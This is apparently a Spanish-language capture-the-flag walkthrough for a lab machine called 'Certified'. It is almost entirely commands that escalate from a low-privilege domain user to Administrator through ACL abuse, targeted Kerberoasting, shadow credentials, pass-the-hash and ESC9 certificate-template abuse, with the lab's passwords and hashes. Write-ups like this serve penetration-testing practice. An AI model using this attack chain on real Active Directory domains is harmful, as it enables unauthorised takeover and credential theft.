---
title: "Certified"
---

# Certified

```
judith.mader \ judith09
```

```bash
impacket-GetUserSPNs certified.htb/judith.mader:judith09 -request
```

**TIENE WRITE OWNER SOBRE GRUPO MANAGEMENT**

```bash
bloodyAD --host DC01.certified.htb -d certified.htb -u 'judith.mader' -p 'judith09' set owner management judith.mader
```

```bash
bloodyAD --host DC01.certified.htb -d certified.htb -u 'judith.mader' -p 'judith09' add genericAll 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' judith.mader
```

**MANAGEMENT TIENE GenericWrite sobre  MANAGEMENT_SVC**

Nos añadimos al grupo MANAGEMENT

```PYTHON
bloodyAD --host 10.10.11.41 -d DC01.certified.htb -u judith.mader   -p judith09   add groupMember 'MANAGEMENT' judith.mader
```

No podemos crackear el hash al parecer
```python
sudo python3 targetedKerberoast.py -v -d certified.htb -u 'judith.mader' -p 'judith09' --request-user MANAGEMENT_SVC -o management_svc.kerb
```

Por tener GenericAll sobre un grupo no tenemos GenericAll sobre los integrantes

Pero al ser miembro de MANAGEMENT tenemos GenericWrite sobre MANAGEMENT_SVC

```bash
certipy shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account 'MANAGEMENT_SVC' -dc-ip 10.10.11.41
```

```bash
netexec smb 10.10.11.41 -u 'MANAGEMENT_SVC' -H 'a091c1832bcdd4677c28b5a6a1295584' -d certified.htb
```

```bash
evil-winrm -i 10.10.11.41 -u MANAGEMENT_SVC -H 'a091c1832bcdd4677c28b5a6a1295584'
```

Tenemos GenericAll sobre ca_operator

```bash
rpcclient -U 'MANAGEMENT_SVC%a091c1832bcdd4677c28b5a6a1295584' 10.10.11.41 --pw-nt-hash
```

```bash
setuserinfo2 CA_OPERATOR 23 'TYx4huMwMr$zbzabeGJS'
```

```
CA_OPERATOR \ TYx4huMwMr$zbzabeGJS
```

Tengo control sobre el usuario que lleva la autoridad certificadora

Para saber el nombre de la CA
```bash
certipy find -u CA_OPERATOR -p 'TYx4huMwMr$zbzabeGJS' -dc-ip 10.10.11.41
```

Se llama `certified-DC01-CA`

Buscamos vulns
```bash
certipy find -vulnerable -u 'CA_OPERATOR' -p 'TYx4huMwMr$zbzabeGJS' -dc-ip 10.10.11.41
```

# Vulnerable a ESC9

Buscamos plantillas vulnerables
```bash
certipy-ad find -vulnerable -u 'CA_OPERATOR' -p 'TYx4huMwMr$zbzabeGJS' -dc-ip 10.10.11.41
```

- La plantilla `CertifiedAuthentication` tiene no security extension.
- Como usuario MANAGEMENT_SVC tenemos genericwrite sobre CA_OPERATOR

Cambiamos el UPN del usuario sobre el que tenemos GenericWrite/All

```bash
certipy account update -u 'MANAGEMENT_SVC' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user CA_OPERATOR -upn administrator@certified.htb -dc-ip 10.10.11.41
```

Solicitamos un certificado como el usuario
```bash
certipy req -u 'ca_operator@certified.htb' -p 'TYx4huMwMr$zbzabeGJS' -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
```

Lo dejamos como estaba
```bash
certipy account update -u 'MANAGEMENT_SVC' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user CA_OPERATOR -upn ca_operator@certified.htb -dc-ip 10.10.11.41
```

No autenticamos con ese certificado
```bash
certipy auth -dc-ip '10.10.11.41' -pfx 'administrator.pfx' -username 'administrator' -domain 'certified.htb'
```

```bash
evil-winrm -i 10.10.11.41 -u Administrator -H '0d5b49608bbce1751f708748f67e2d34'
```
